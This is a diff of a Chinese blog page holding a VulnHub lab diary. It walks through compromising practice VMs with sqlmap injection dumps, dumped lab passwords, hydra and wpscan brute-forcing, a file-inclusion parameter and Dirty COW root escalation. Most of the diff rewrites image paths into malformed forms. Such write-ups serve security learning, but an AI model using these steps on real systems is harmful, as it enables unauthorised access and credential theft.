@@ -16,57 +16,57 @@
   <meta name="author" content="Greed">
   <meta name="keywords" content="">
   
-    <meta name="description" content="先附一份网上找的难易顺序图，由于是从零开始，这里是先把容易的做完后尝试了几个latest  这里只放出了几个writeup写的相对较完整的记录 doubletrouble1第一层 扫ip 发现端口 22 80 访问80网页，发现cms  qdpm 9.1 searchsploit qdpm 9.1 发现存在rce漏洞但需要登录 dirb目录发现 &#x2F;secret&#x2F;图片 和 隐写工">
+    <meta name="description" content="先附一份网上找的难易顺序图，由于是从零开始，这里是先把容易的做完后尝试了几个latest     这里只放出了几个writeup写的相对较完整的记录 doubletrouble1第一层 扫ip 发现端口 22 80 访问80网页，发现cms  qdpm 9.1 searchsploit qdpm 9.1 发现存在rce漏洞但需要登录 dirb目录发现 &#x2F;secret&#x2F;图片 和">
 <meta property="og:type" content="article">
 <meta property="og:title" content="vulnhub靶场日记">
 <meta property="og:url" content="https://just1greed.github.io/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Welcome to greed&#39; blog">
-<meta property="og:description" content="先附一份网上找的难易顺序图，由于是从零开始，这里是先把容易的做完后尝试了几个latest  这里只放出了几个writeup写的相对较完整的记录 doubletrouble1第一层 扫ip 发现端口 22 80 访问80网页，发现cms  qdpm 9.1 searchsploit qdpm 9.1 发现存在rce漏洞但需要登录 dirb目录发现 &#x2F;secret&#x2F;图片 和 隐写工">
+<meta property="og:description" content="先附一份网上找的难易顺序图，由于是从零开始，这里是先把容易的做完后尝试了几个latest     这里只放出了几个writeup写的相对较完整的记录 doubletrouble1第一层 扫ip 发现端口 22 80 访问80网页，发现cms  qdpm 9.1 searchsploit qdpm 9.1 发现存在rce漏洞但需要登录 dirb目录发现 &#x2F;secret&#x2F;图片 和">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164041503.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164241627.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164620259.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164858731.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919165010345.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230920105133832.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921111846366.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140036952.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140411876.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142129436.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142226537.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142411444.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921143305226.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921161510525.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921161918549.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921162039258.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924123213003.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924124522092.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924131119001.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924195118235.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231007144216893.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121235017.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121558813.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008123855027.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008131000426.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133315836.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133359694.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133645461.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019145058250.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154450410.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154846474.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155326248.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155445880.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161033785.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161907131.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162547602.png">
-<meta property="og:image" content="c:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162610010.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162750514.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162857617.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019163337680.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019164601120.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020131018436.png">
-<meta property="og:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020133345647.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164041503.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164241627.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164620259.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//image-20230919164858731.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//image-20230919165010345.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230920105133832.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230921111846366.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230921140036952.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230921140411876.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230921142129436.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230921142226537.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230921142411444.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921143305226.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//image-20230921161510525.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//image-20230921161918549.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//image-20230921162039258.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230924123213003.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230924124522092.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230924131119001.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20230924195118235.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231007144216893.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231008121235017.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231008121558813.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231008123855027.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231008131000426.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231008133315836.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231008133359694.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133645461.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019145058250.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019154450410.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019154846474.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019155326248.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019155445880.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019161033785.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019161907131.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019162547602.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//Users/yanyiyin/AppData/Roaming/Typora/typora-user-images/image-20231019162610010.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162750514.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162857617.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019163337680.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019164601120.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020131018436.png">
+<meta property="og:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020133345647.png">
 <meta property="article:published_time" content="2023-11-26T03:57:06.000Z">
 <meta property="article:modified_time" content="2023-11-26T04:16:40.621Z">
 <meta property="article:author" content="Greed">
@@ -74,7 +74,7 @@
 <meta property="article:tag" content="vulnhub">
 <meta property="article:tag" content="学习">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://just1greed.github.io/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png">
+<meta name="twitter:image" content="https://just1greed.github.io/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -351,7 +351,10 @@
               <div class="markdown-body">
                 
                 <p>先附一份网上找的难易顺序图，由于是从零开始，这里是先把容易的做完后尝试了几个latest</p>
-<p><img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png" srcset="/img/loading.gif" lazyload alt="难易顺序"></p>
+<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png" srcset="/img/loading.gif" lazyload class title="难易顺序">
+
+
+
 <p>这里只放出了几个writeup写的相对较完整的记录</p>
 <h3 id="doubletrouble1"><a href="#doubletrouble1" class="headerlink" title="doubletrouble1"></a>doubletrouble1</h3><h4 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h4><ol>
 <li>扫ip 发现端口</li>
@@ -376,29 +379,29 @@
 </li>
 <li><p>80端口存在登录框，用sqlmap爆破</p>
 </li>
-<li><p>发现用户名uname处存在时间盲注，爆破数据库<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164041503.png" srcset="/img/loading.gif" lazyload alt="image-20230919164041503"></p>
+<li><p>发现用户名uname处存在时间盲注，爆破数据库<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164041503.png" srcset="/img/loading.gif" lazyload class title="image-20230919164041503"></p>
 </li>
 <li><p>针对doubletrouble库爆破表</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;uname=11&amp;psw=11&amp;btnLogin=Login&quot;</span> <span class="hljs-attr">--D</span> doubletrouble <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164241627.png" srcset="/img/loading.gif" lazyload alt="image-20230919164241627"></p>
+<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164241627.png" srcset="/img/loading.gif" lazyload class title="image-20230919164241627">
 </li>
 <li><p>爆破列</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users --columns --batch</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164620259.png" srcset="/img/loading.gif" lazyload alt="image-20230919164620259"></p>
+<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164620259.png" srcset="/img/loading.gif" lazyload class title="image-20230919164620259">
 </li>
 <li><p>爆数据</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C username --dump --batch</span><br><br><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C password --dump --batch</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164858731.png" srcset="/img/loading.gif" lazyload alt="image-20230919164858731"><img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919165010345.png" srcset="/img/loading.gif" lazyload alt="image-20230919165010345"></p>
+<p><img src="/.io//image-20230919164858731.png" srcset="/img/loading.gif" lazyload alt="image-20230919164858731"><img src="/.io//image-20230919165010345.png" srcset="/img/loading.gif" lazyload alt="image-20230919165010345"></p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| username |</span><br><span class="hljs-section">+----------+</span><br>| clapton  |<br><span class="hljs-section">| montreux |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure>
 
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| password |</span><br><span class="hljs-section">+----------+</span><br>| GfsZxc1  |<br><span class="hljs-section">| ZubZub99 |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>web无法登录，尝试ssh</p>
 </li>
-<li><p>ssh <a href="mailto:&#99;&#97;&#x6c;&#x70;&#116;&#x6f;&#x6e;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x34;&#56;&#x2e;&#49;&#51;&#x38;">&#99;&#97;&#x6c;&#x70;&#116;&#x6f;&#x6e;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x34;&#56;&#x2e;&#49;&#51;&#x38;</a>  密码 ZubZub99 登陆成功</p>
+<li><p>ssh <a href="mailto:&#99;&#97;&#108;&#112;&#x74;&#x6f;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x34;&#56;&#x2e;&#49;&#x33;&#x38;">&#99;&#97;&#108;&#112;&#x74;&#x6f;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x34;&#56;&#x2e;&#49;&#x33;&#x38;</a>  密码 ZubZub99 登陆成功</p>
 </li>
 <li><p>脏牛提权，拿flag</p>
 </li>
@@ -406,20 +409,20 @@
 <h3 id="deathnote1"><a href="#deathnote1" class="headerlink" title="deathnote1"></a>deathnote1</h3><ol>
 <li>扫ip，发现端口 22 80</li>
 <li>扫目录，robots.txt 里面发现了他爹的提示在 &#x2F;important.jpg</li>
-<li>访问&#x2F;important.jpg ，抓包得到他爹的提示  账号在user.txt(不用你说我也发现了)  密码在某个网页的源码里<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230920105133832.png" srcset="/img/loading.gif" lazyload alt="image-20230920105133832"></li>
+<li>访问&#x2F;important.jpg ，抓包得到他爹的提示  账号在user.txt(不用你说我也发现了)  密码在某个网页的源码里<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230920105133832.png" srcset="/img/loading.gif" lazyload alt="image-20230920105133832"></li>
 <li>还是wordpress，还是一眼的uploads文件夹，找到user.txt 和 notes.txt, 先保存在本地</li>
 <li>尝试访问&#x2F;wordpress&#x2F;，一直加载中(汤姆生气.jpg)，[直接wget下载源码，replace所有的deathnote.vuln为192.168.48.140 本地访问][也可以修改host文件]，发现hint中存在疑似密码 iamjustic3 先保存</li>
 <li>尝试hydra 进行ssh爆破，大小写都失败，换思路</li>
-<li>用wpscan扫描，-U user.txt -P password –api-token [token] 扫出来了<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921111846366.png" srcset="/img/loading.gif" lazyload alt="image-20230921111846366" /></li>
+<li>用wpscan扫描，-U user.txt -P password –api-token [token] 扫出来了<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921111846366.png" srcset="/img/loading.gif" lazyload alt="image-20230921111846366"></li>
 <li>访问&#x2F;wordpress&#x2F;wp-admin， 用小写账号密码登录，成功进入wp管理页面</li>
 <li>后台页面不让改，msf利用wp_admin_shell_upload 也不行   重新整合已有数据</li>
-<li>notes.txt里像是一个字典，尝试hydra ssh爆破，密码用notes.txt, 跑出来一个<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140036952.png" srcset="/img/loading.gif" lazyload alt="image-20230921140036952"></li>
-<li>ssh 连接进 l 用户，家目录有user.txt，鉴定为brainfuck，直接解码<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140411876.png" srcset="/img/loading.gif" lazyload alt="image-20230921140411876"></li>
+<li>notes.txt里像是一个字典，尝试hydra ssh爆破，密码用notes.txt, 跑出来一个<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140036952.png" srcset="/img/loading.gif" lazyload alt="image-20230921140036952"></li>
+<li>ssh 连接进 l 用户，家目录有user.txt，鉴定为brainfuck，直接解码<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140411876.png" srcset="/img/loading.gif" lazyload alt="image-20230921140411876"></li>
 <li>在opt&#x2F;L&#x2F;文件下有个提示，让看fake文件夹，cd进去，发现一个hint和一段wav文件</li>
-<li>hint让用cyberchef，cat base.wav 得到一串数字<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142129436.png" srcset="/img/loading.gif" lazyload alt="image-20230921142129436"></li>
-<li>cyberchef后得到密码 <img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142226537.png" srcset="/img/loading.gif" lazyload alt="image-20230921142226537" style="zoom: 80%;" /></li>
-<li>利用账号密码ssh到kira账户，拿到第一个flag<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142411444.png" srcset="/img/loading.gif" lazyload alt="image-20230921142411444"></li>
-<li>sudo -l 发现all   直接sudo su到root权限，cat &#x2F;root&#x2F;root.txt<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921143305226.png" srcset="/img/loading.gif" lazyload alt="image-20230921143305226"></li>
+<li>hint让用cyberchef，cat base.wav 得到一串数字<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142129436.png" srcset="/img/loading.gif" lazyload alt="image-20230921142129436"></li>
+<li>cyberchef后得到密码 <img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142226537.png" srcset="/img/loading.gif" lazyload alt="image-20230921142226537" style="zoom: 80%;"></li>
+<li>利用账号密码ssh到kira账户，拿到第一个flag<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142411444.png" srcset="/img/loading.gif" lazyload alt="image-20230921142411444"></li>
+<li>sudo -l 发现all   直接sudo su到root权限，cat &#x2F;root&#x2F;root.txt<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921143305226.png" srcset="/img/loading.gif" lazyload class title="image-20230921143305226"></li>
 </ol>
 <p>CONGRAT!!!!!!!</p>
 <h3 id="evalbox1"><a href="#evalbox1" class="headerlink" title="evalbox1"></a>evalbox1</h3><h4 id="本题新知识"><a href="#本题新知识" class="headerlink" title="本题新知识"></a>本题新知识</h4><ul>
@@ -433,7 +436,7 @@
 <ol>
 <li><p>扫ip，发现端口22，80</p>
 </li>
-<li><p>扫目录，发现了个robots.txt，暂时没啥用，还有个&#x2F;secret&#x2F; 不可直接查看内容<img src="vulnhub靶场日记/image-20230921161510525.png" srcset="/img/loading.gif" lazyload alt="image-20230921161510525" style="zoom: 25%;" /></p>
+<li><p>扫目录，发现了个robots.txt，暂时没啥用，还有个&#x2F;secret&#x2F; 不可直接查看内容<img src="/.io//image-20230921161510525.png" srcset="/img/loading.gif" lazyload alt="image-20230921161510525" style="zoom: 25%;"></p>
 </li>
 <li><p>扫&#x2F;secret&#x2F;下文件，失败，添加.php后缀，扫到&#x2F;secret&#x2F;evil.php</p>
 </li>
@@ -442,7 +445,7 @@
 <li><p>burp开始爆破，字典用web-fuzzing-dir里的parameter 7w多个参数名</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret/evil.php?§aaa§=../index.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.48.141<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>发现存在参数command，检查后确定为文件包含漏洞<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921161918549.png" srcset="/img/loading.gif" lazyload alt="image-20230921161918549">   <img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921162039258.png" srcset="/img/loading.gif" lazyload alt="image-20230921162039258"></p>
+<li><p>发现存在参数command，检查后确定为文件包含漏洞<img src="/.io//image-20230921161918549.png" srcset="/img/loading.gif" lazyload alt="image-20230921161918549">   <img src="/.io//image-20230921162039258.png" srcset="/img/loading.gif" lazyload alt="image-20230921162039258"></p>
 </li>
 <li><p>利用php伪协议，拿到evil.php源码，只有一句include，无任何防护，直接开日</p>
 </li>
@@ -469,18 +472,18 @@
 </li>
 <li><p>我们先尝试寻找deception基地，这里用到个新工具 <code>sharlock</code> （半社工工具，在社交平台搜索用户名），没搜出来，教程写的也有问题，扫出来有个<code>deception-base</code>，但是正确的用户叫<code>decepticon-base</code>，多了个c，咱也不知道人家咋整出来正确的，反正人家这样写的，我找不到</p>
 </li>
-<li><p>我们访问这个基地<code>https://github.com/decepticon-base/Projects</code>，发现内容被删了<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924123213003.png" srcset="/img/loading.gif" lazyload alt="image-20230924123213003"></p>
+<li><p>我们访问这个基地<code>https://github.com/decepticon-base/Projects</code>，发现内容被删了<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924123213003.png" srcset="/img/loading.gif" lazyload alt="image-20230924123213003"></p>
 </li>
